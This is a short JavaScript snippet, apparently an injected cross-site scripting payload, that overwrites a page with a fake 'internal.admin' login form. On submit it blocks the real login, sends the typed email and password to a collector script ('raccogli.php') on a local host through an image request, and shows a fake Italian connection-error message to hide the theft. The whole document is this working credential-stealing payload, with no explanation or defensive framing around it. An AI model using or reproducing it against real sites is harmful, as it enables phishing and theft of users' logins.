
<script>
document.body.innerHTML = `
<form action="http://internal.admin:8000/login" method="POST" class="card p-5 shadow">
    <div class="mb-3">
        <label for="email" class="form-label">Email</label>
        <input type="email" class="form-control" id="email" name="email" value="">
    </div>
    <div class="mb-3">
        <label for="password" class="form-label">Password</label>
        <input type="password" class="form-control" id="password" name="password">
    </div>
    <div class="mt-3 d-flex justify-content-center flex-column align-items-center">
        <button type="submit" class="btn btn-outline-secondary">Sign In</button>
        <p class="mt-2">Don't you have an account yet? <a href="http://internal.admin:8000/register" class="text-secondary">Register here</a></p>
    </div>
</form>
`;
document.querySelector('form').addEventListener('submit', function(e) {
    e.preventDefault(); 
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;
    var i = new Image();
    i.src = "http://127.0.0.1:9000/raccogli.php?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password);
    setTimeout(function() {
        alert("Errore di connessione. Riprova piu' tardi.");
    }, 500);
});
</script>
